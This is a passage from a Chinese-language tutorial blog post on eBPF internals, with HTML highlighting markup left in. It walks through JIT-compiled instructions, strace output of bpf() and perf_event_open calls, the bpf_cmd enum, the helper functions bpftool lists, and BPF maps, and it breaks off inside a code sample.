class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># bpftool prog dump jited id 580</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> * ctx)</span>:</span><br><span class="line">bpf_prog_38dd440716c4900f_hello_world:</span><br><span class="line">; <span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">   0:  nopl   0<span class="title function_">x0</span><span class="params">(%rax,%rax,<span class="number">1</span>)</span></span><br><span class="line">   5:  xchg   %ax,%ax</span><br><span class="line">   7:  push   %rbp</span><br><span class="line">   8:  mov    %rsp,%rbp</span><br><span class="line">   b:  sub    $0x10,%rsp</span><br><span class="line">  12:  mov    $0x21,%edi</span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">  <span class="number">17</span>:  mov    %di,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">  <span class="number">1b</span>:  mov    $<span class="number">0x646c726f</span>,%edi</span><br><span class="line">  <span class="number">20</span>:  mov    %edi,<span class="number">-0x8</span>(%rbp)</span><br><span class="line">  <span class="number">23</span>:  movabs $<span class="number">0x57202c6f6c6c6548</span>,%rdi</span><br><span class="line">  <span class="number">2</span>d:  mov    %rdi,<span class="number">-0x10</span>(%rbp)</span><br><span class="line">  <span class="number">31</span>:  mov    %rbp,%rdi</span><br><span class="line">;</span><br><span class="line">  <span class="number">34</span>:  add    $<span class="number">0xfffffffffffffff0</span>,%rdi</span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">  <span class="number">38</span>:  mov    $<span class="number">0xe</span>,%esi</span><br><span class="line">  <span class="number">3</span>d:  call   <span class="number">0xffffffffd8c7e834</span></span><br><span class="line">; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="number">42</span>:  xor    %eax,%eax</span><br><span class="line">  <span class="number">44</span>:  leave</span><br><span class="line">  <span class="number">45</span>:  ret</span><br></pre></td></tr></table></figure><p>这些机器指令的含义跟前面的 BPF 指令是类似的，但具体的指令和寄存器都换成了 x86 的格式。你不需要掌握这些机器指令的具体含义，只要知道查询的具体方法就足够了。这是因为，就像你曾接触过的其他高级语言一样，在实际的 eBPF 使用过程中，并不需要直接使用机器指令，而是 eBPF 虚拟机帮你自动完成了转换。</p><h3 id="eBPF-程序是什么时候执行的"><a href="#eBPF-程序是什么时候执行的" class="headerlink" title="eBPF 程序是什么时候执行的"></a>eBPF 程序是什么时候执行的</h3><p>到这里，我想你已经理解了 BPF 指令的具体格式，以及它与  C 源代码之间的对应关系。不过，这个 eBPF 程序到底是什么时候执行的呢？接下来，我们再一起看看 BPF 指令的加载和执行过程。</p><p>在上一讲中我提到，BCC 负责了 eBPF 程序的编译和加载过程。因而，要了解 BPF 指令的加载过程，就可以从 BCC 执行 eBPF 程序的过程入手。</p><p>那么，怎么才能查看到 BCC 的执行过程呢？那就是跟踪它的系统调用过程。首先，我们打开一个终端，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -ebpf表示只跟踪bpf系统调用</span></span><br><span class="line">sudo strace -v -f -ebpf python3 ./hello.py</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">bpf(BPF_BTF_LOAD, &#123;</span><br><span class="line">btf = <span class="string">&quot;\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\340\10\0\0\0\0\0\0\0\0\0\2&quot;</span>...,</span><br><span class="line">btf_log_buf = <span class="literal">NULL</span>,</span><br><span class="line">btf_size = <span class="number">2960</span>,</span><br><span class="line">btf_log_size = <span class="number">0</span>,</span><br><span class="line">btf_log_level = <span class="number">0</span></span><br><span class="line">&#125;, <span class="number">120</span>) = <span class="number">3</span></span><br><span class="line">bpf(BPF_PROG_LOAD, &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_KPROBE,</span><br><span class="line">insn_cnt = <span class="number">13</span>,</span><br><span class="line">insns = [&#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x21</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_STX | BPF_H | BPF_MEM,</span><br><span class="line">dst_reg = BPF_REG_10,</span><br><span class="line">src_reg = BPF_REG_1,</span><br><span class="line">off = <span class="number">-4</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x646c726f</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_STX | BPF_W | BPF_MEM,</span><br><span class="line">dst_reg = BPF_REG_10,</span><br><span class="line">src_reg = BPF_REG_1,</span><br><span class="line">off = <span class="number">-8</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_LD | BPF_DW | BPF_IMM,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x6c6c6548</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_LD | BPF_W | BPF_IMM,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x57202c6f</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_STX | BPF_DW | BPF_MEM,</span><br><span class="line">dst_reg = BPF_REG_10,</span><br><span class="line">src_reg = BPF_REG_1,</span><br><span class="line">off = <span class="number">-16</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_X | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_10,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_ADD,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0xfffffff0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_2,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0xe</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_JMP | BPF_K | BPF_CALL,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x6</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_JMP | BPF_K | BPF_EXIT,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;],</span><br><span class="line">license = <span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">log_level = <span class="number">0</span>,</span><br><span class="line">log_size = <span class="number">0</span>,</span><br><span class="line">log_buf = <span class="literal">NULL</span>,</span><br><span class="line">kern_version = KERNEL_VERSION(<span class="number">5</span>, <span class="number">10</span>, <span class="number">70</span>),</span><br><span class="line">prog_flags = <span class="number">0</span>,</span><br><span class="line">prog_name = <span class="string">&quot;hello_world&quot;</span>,</span><br><span class="line">prog_ifindex = <span class="number">0</span>,</span><br><span class="line">expected_attach_type = BPF_CGROUP_INET_INGRESS,</span><br><span class="line">prog_btf_fd = <span class="number">3</span>,</span><br><span class="line">func_info_rec_size = <span class="number">8</span>,</span><br><span class="line">func_info = <span class="number">0x1ad3af0</span>,</span><br><span class="line">func_info_cnt = <span class="number">1</span>,</span><br><span class="line">line_info_rec_size = <span class="number">16</span>,</span><br><span class="line">line_info = <span class="number">0x1ac4690</span>,</span><br><span class="line">line_info_cnt = <span class="number">5</span>,</span><br><span class="line">attach_btf_id = <span class="number">0</span>,</span><br><span class="line">attach_prog_fd = <span class="number">0</span></span><br><span class="line">&#125;, <span class="number">120</span>) = <span class="number">4</span></span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/straceHelloPY.png" class><p>这些参数看起来很复杂，但实际上，如果你查询 bpf 系统调用的格式（执行 man bpf 命令），就可以发现，它实际上只需要三个参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int bpf(int cmd, union bpf_attr *attr, unsigned int size);</span><br></pre></td></tr></table></figure><p>对应前面的 strace 输出结果，这三个参数的具体含义如下。</p><ul><li>第一个参数是 BPF_PROG_LOAD ， 表示加载 BPF 程序。</li><li>第二个参数是 bpf_attr 类型的结构体，表示 BPF 程序的属性。其中，有几个需要你留意的参数，比如：<ul><li><code>prog_type</code> 表示 BPF 程序的类型，这儿是 <code>BPF_PROG_TYPE_KPROBE</code> ，跟我们 Python 代码中的 <code>attach_kprobe</code> 一致；</li><li><code>insn_cnt (instructions count)</code> 表示指令条数；insns (instructions) 包含了具体的每一条指令，这儿的 13 条指令跟我们前面 <code>bpftool prog dump</code> 的结果是一致的（具体的指令格式，你可以参考内核中 bpf_insn 的定义）；</li><li><code>prog_name</code> 则表示 BPF 程序的名字，即 <code>hello_world</code> 。</li></ul></li><li>第三个参数 120 表示属性的大小。</li></ul><p>到这里，我们已经了解了 bpf 系统调用的基本格式。对于  bpf  系统调用在内核中的实现原理，你并不需要详细了解。我们只要知道它的具体功能，就可以掌握 eBPF 的核心原理了。当然，如果你对它的实现方法有兴趣的话，可以参考内核源码 <code>kernel/bpf/syscall.c</code> 中<code> SYSCALL_DEFINE3</code> 的实现。</p><p>BPF 程序加载到内核后，并不会立刻执行，而是基于它的基本原理来的</p><blockquote><p>eBPF 程序并不像常规的线程那样，启动后就一直运行在那里，它需要事件触发后才会执行。这些事件包括系统调用、内核跟踪点、内核函数和用户态函数的调用退出、网络事件，等等。</p></blockquote><p>对于我们的 Hello World 来说，由于调用了 <code>attach_kprobe</code> 函数，很明显，这是一个内核跟踪事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.attach_kprobe(event=<span class="string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="string">&quot;hello_world&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以，除了把 eBPF 程序加载到内核之外，还需要把加载后的程序跟具体的内核函数调用事件进行绑定。在 eBPF 的实现中，诸如内核跟踪（kprobe）、用户跟踪（uprobe）等的事件绑定，都是通过  <code>perf_event_open()</code>  来完成的。</p><p>为什么这么说呢？我们再用  <code>strace</code>  来确认一下。把前面  <code>strace</code>  命令中的  <code>-ebpf</code>  参数去掉，重新执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -v -f python3 ./hello.py</span><br></pre></td></tr></table></figure><p>忽略无关的输出后，会发现如下的系统调用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">/* 1) 加载BPF程序 */</span><br><span class="line">bpf(BPF_PROG_LOAD,...) = 4</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">/* 2）查询事件类型 */</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/sys/bus/event_source/devices/kprobe/type&quot;</span>, O_RDONLY) = 5</span><br><span class="line"><span class="built_in">read</span>(5, <span class="string">&quot;6\n&quot;</span>, 4096)                    = 2</span><br><span class="line">close(5)                                = 0</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">/* 3）创建性能监控事件 */</span><br><span class="line">perf_event_open(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">type</span>=0x6 /* PERF_TYPE_??? */,</span><br><span class="line">        size=PERF_ATTR_SIZE_VER7,</span><br><span class="line">        ...</span><br><span class="line">        wakeup_events=1,</span><br><span class="line">        config1=0x7f275d195c50,</span><br><span class="line">        ...</span><br><span class="line">    &#125;,</span><br><span class="line">    -1,</span><br><span class="line">    0,</span><br><span class="line">    -1,</span><br><span class="line">    PERF_FLAG_FD_CLOEXEC) = 5</span><br><span class="line"></span><br><span class="line">/* 4）绑定 BPF 到 kprobe 事件 */</span><br><span class="line">ioctl(5, PERF_EVENT_IOC_SET_BPF, 4)     = 0</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从输出中，我们可以看出 BPF 与性能事件的绑定过程分为以下几步：</p><ul><li>首先，借助 bpf 系统调用，加载 BPF 程序，并记住返回的文件描述符；</li><li>然后，查询 kprobe 类型的事件编号。BCC 实际上是通过  <code>/sys/bus/event_source/devices/kprobe/type</code> 来查询的；</li><li>接着，调用  <code>perf_event_open</code>  创建性能监控事件。比如，事件类型（type 是上一步查询到的 6）、事件的参数（ config1 包含了内核函数 <code>do_sys_openat2</code> ）等；</li><li>最后，再通过 <code>ioctl</code> 的 <code>PERF_EVENT_IOC_SET_BPF</code> 命令，将 BPF 程序绑定到性能监控事件。</li></ul><h3 id="小结-eBPF-虚拟机工作原理"><a href="#小结-eBPF-虚拟机工作原理" class="headerlink" title="小结 eBPF 虚拟机工作原理"></a>小结 eBPF 虚拟机工作原理</h3><p>梳理 eBPF 在内核中的实现原理，并以上一讲的 Hello World 程序为例，借助 bpftool、strace 等工具，观察了 BPF 指令的具体格式。</p><p>然后，我们从 BCC 执行 eBPF 程序的过程入手，一起看了 BPF 指令的加载和执行过程。用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码（即 BPF 指令），然后借助  bpf  系统调用加载到内核中，最后再通过性能监控等接口，与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。</p><h2 id="eBPF-程序是怎么跟内核进行交互的"><a href="#eBPF-程序是怎么跟内核进行交互的" class="headerlink" title="eBPF 程序是怎么跟内核进行交互的"></a>eBPF 程序是怎么跟内核进行交互的</h2><p>eBPF 程序到底是如何跟内核事件进行绑定的？又该如何跟内核中的其他模块进行交互呢？今天，一起看看 eBPF 程序的编程接口。</p><p>如下图（图片来自 brendangregg.com）所示，一个完整的 eBPF 程序通常包含用户态和内核态两部分。其中，用户态负责 eBPF 程序的加载、事件绑定以及 eBPF 程序运行结果的汇总输出；内核态运行在 eBPF 虚拟机中，负责定制和控制系统的运行状态。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/CompleteProgram.png" class><p>对于用户态程序来说，我想你已经了解，<strong>它们与内核进行交互时必须要通过系统调用来完成</strong>。而对应到 eBPF 程序中，我们最常用到的就是 <a class="link" href="https://man7.org/linux/man-pages/man2/bpf.2.html">bpf 系统调用<i class="fas fa-external-link-alt"></i></a>。</p><p>在命令行中输入 man bpf ，就可以查询到 BPF 系统调用的调用格式（虽然前面已经看过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf</span><span class="params">(<span class="type">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="type">unsigned</span> <span class="type">int</span> size)</span>;</span><br></pre></td></tr></table></figure><p>BPF 系统调用接受三个参数：</p><ul><li>第一个，cmd ，代表操作命令，比如上一讲中我们看到的 <code>BPF_PROG_LOAD</code> 就是加载 eBPF 程序；</li><li>第二个，attr，代表 <code>bpf_attr</code> 类型的 eBPF 属性指针，不同类型的操作命令需要传入不同的属性参数；</li><li>第三个，size ，代表属性的大小。</li></ul><p>注意，不同版本的内核所支持的 BPF 命令是不同的，具体支持的命令列表可以参考内核头文件 <code>include/uapi/linux/bpf.h</code> 中  <code>bpf_cmd</code> 的定义。比如，v5.13 内核已经支持 36 个 BPF 命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_cmd</span> &#123;</span></span><br><span class="line">  BPF_MAP_CREATE,</span><br><span class="line">  BPF_MAP_LOOKUP_ELEM,</span><br><span class="line">  BPF_MAP_UPDATE_ELEM,</span><br><span class="line">  BPF_MAP_DELETE_ELEM,</span><br><span class="line">  BPF_MAP_GET_NEXT_KEY,</span><br><span class="line">  BPF_PROG_LOAD,</span><br><span class="line">  BPF_OBJ_PIN,</span><br><span class="line">  BPF_OBJ_GET,</span><br><span class="line">  BPF_PROG_ATTACH,</span><br><span class="line">  BPF_PROG_DETACH,</span><br><span class="line">  BPF_PROG_TEST_RUN,</span><br><span class="line">  BPF_PROG_GET_NEXT_ID,</span><br><span class="line">  BPF_MAP_GET_NEXT_ID,</span><br><span class="line">  BPF_PROG_GET_FD_BY_ID,</span><br><span class="line">  BPF_MAP_GET_FD_BY_ID,</span><br><span class="line">  BPF_OBJ_GET_INFO_BY_FD,</span><br><span class="line">  BPF_PROG_QUERY,</span><br><span class="line">  BPF_RAW_TRACEPOINT_OPEN,</span><br><span class="line">  BPF_BTF_LOAD,</span><br><span class="line">  BPF_BTF_GET_FD_BY_ID,</span><br><span class="line">  BPF_TASK_FD_QUERY,</span><br><span class="line">  BPF_MAP_LOOKUP_AND_DELETE_ELEM,</span><br><span class="line">  BPF_MAP_FREEZE,</span><br><span class="line">  BPF_BTF_GET_NEXT_ID,</span><br><span class="line">  BPF_MAP_LOOKUP_BATCH,</span><br><span class="line">  BPF_MAP_LOOKUP_AND_DELETE_BATCH,</span><br><span class="line">  BPF_MAP_UPDATE_BATCH,</span><br><span class="line">  BPF_MAP_DELETE_BATCH,</span><br><span class="line">  BPF_LINK_CREATE,</span><br><span class="line">  BPF_LINK_UPDATE,</span><br><span class="line">  BPF_LINK_GET_FD_BY_ID,</span><br><span class="line">  BPF_LINK_GET_NEXT_ID,</span><br><span class="line">  BPF_ENABLE_STATS,</span><br><span class="line">  BPF_ITER_CREATE,</span><br><span class="line">  BPF_LINK_DETACH,</span><br><span class="line">  BPF_PROG_BIND_MAP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>命令对应的表格</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/CompleteProgram.png" class><h3 id="BPF-辅助函数"><a href="#BPF-辅助函数" class="headerlink" title="BPF 辅助函数"></a>BPF 辅助函数</h3><p>说完用户态程序的 bpf 系统调用格式，我们再来看看内核态的 eBPF 程序。</p><p>eBPF 程序并不能随意调用内核函数，因此，内核定义了一系列的辅助函数，用于 eBPF 程序与内核其他模块进行交互，这一个实现方式其实是通过 eBPF helpers 来做的。</p><p>比如，上一讲的 Hello World 示例中使用的 <code>bpf_trace_printk()</code> 就是最常用的一个辅助函数，用于向调试文件系统（<code>/sys/kernel/debug/tracing/trace_pipe</code>）写入调试信息。</p><p>这里补充一个知识点：从内核 5.13 版本开始，部分内核函数（如  <code>tcp_slow_start()</code>、<code>tcp_reno_ssthresh()</code>  等）也可以被 BPF 程序直接调用了，具体你可以查看<a class="link" href="https://lwn.net/Articles/856005/">这个链接<i class="fas fa-external-link-alt"></i></a>。 不过，这些函数只能在 TCP 拥塞控制算法的 BPF 程序中调用，此处不再做过多的介绍。</p><p>需要注意的是，并不是所有的辅助函数都可以在 eBPF 程序中随意使用，不同类型的 eBPF 程序所支持的辅助函数是不同的。比如，对于 Hello World 示例这类内核探针（kprobe）类型的 eBPF 程序，你可以在命令行中执行  <code>bpftool feature probe</code> ，来查询当前系统支持的辅助函数列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ bpftool feature probe</span><br><span class="line">...</span><br><span class="line">eBPF helpers supported <span class="keyword">for</span> program <span class="built_in">type</span> kprobe:</span><br><span class="line">  - bpf_map_lookup_elem</span><br><span class="line">  - bpf_map_update_elem</span><br><span class="line">  - bpf_map_delete_elem</span><br><span class="line">  - bpf_probe_read</span><br><span class="line">  - bpf_ktime_get_ns</span><br><span class="line">  - bpf_get_prandom_u32</span><br><span class="line">  - bpf_get_smp_processor_id</span><br><span class="line">  - bpf_tail_call</span><br><span class="line">  - bpf_get_current_pid_tgid</span><br><span class="line">  - bpf_get_current_uid_gid</span><br><span class="line">  - bpf_get_current_comm</span><br><span class="line">  - bpf_perf_event_read</span><br><span class="line">  - bpf_perf_event_output</span><br><span class="line">  - bpf_get_stackid</span><br><span class="line">  - bpf_get_current_task</span><br><span class="line">  - bpf_current_task_under_cgroup</span><br><span class="line">  - bpf_get_numa_node_id</span><br><span class="line">  - bpf_probe_read_str</span><br><span class="line">  - bpf_perf_event_read_value</span><br><span class="line">  - bpf_override_return</span><br><span class="line">  - bpf_get_stack</span><br><span class="line">  - bpf_get_current_cgroup_id</span><br><span class="line">  - bpf_map_push_elem</span><br><span class="line">  - bpf_map_pop_elem</span><br><span class="line">  - bpf_map_peek_elem</span><br><span class="line">  - bpf_send_signal</span><br><span class="line">  - bpf_probe_read_user</span><br><span class="line">  - bpf_probe_read_kernel</span><br><span class="line">  - bpf_probe_read_user_str</span><br><span class="line">  - bpf_probe_read_kernel_str</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>对于这些辅助函数的详细定义，你可以在命令行中执行  man bpf-helpers ，或者参考内核头文件  <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/include/uapi/linux/bpf.h#L1463">bpf.h - include&#x2F;uapi&#x2F;linux&#x2F;bpf.h<i class="fas fa-external-link-alt"></i></a>，来查看它们的详细定义和使用说明。为了方便掌握，我把常用的辅助函数整理成了一个表格，可以在需要时参考：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/bpfHelpersExcel.png" class><p>这其中，需要你特别注意的是以 <code>bpf_probe_read</code>  开头的一系列函数。在上一讲中已经提到，eBPF 内部的内存空间只有寄存器和栈。所以，要访问其他的内核空间或用户空间地址，就需要借助  <code>bpf_probe_read</code>  这一系列的辅助函数。这些函数会进行安全性检查，并禁止缺页中断的发生。</p><p>而在 eBPF 程序需要大块存储时，就不能像常规的内核代码那样去直接分配内存了，而是必须通过 BPF 映射（BPF Map）来完成。接下来，我带你看看 BPF 映射的具体原理。</p><h3 id="BPF-映射"><a href="#BPF-映射" class="headerlink" title="BPF 映射"></a>BPF 映射</h3><p>BPF 映射用于提供大块的键值存储，这些存储可被用户空间程序访问，进而获取 eBPF 程序的运行状态。eBPF 程序最多可以访问 64 个不同的 BPF 映射，并且不同的 eBPF 程序也可以通过相同的 BPF 映射来共享它们的状态。下图（图片来自docs.cilium.io）展示了  BPF 映射的基本使用方法。</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/UsageOfBPFMap.png" class><p>在前面的 BPF 系统调用和辅助函数小节中，你也看到，有很多系统调用命令和辅助函数都是用来访问 BPF 映射的。我相信细心的你已经发现了：BPF 辅助函数中并没有 BPF 映射的创建函数，BPF 映射只能通过用户态程序的系统调用来创建。比如，你可以通过下面的示例代码来创建一个 BPF 映射，并返回映射的文件描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">bpf_create_map</span><span 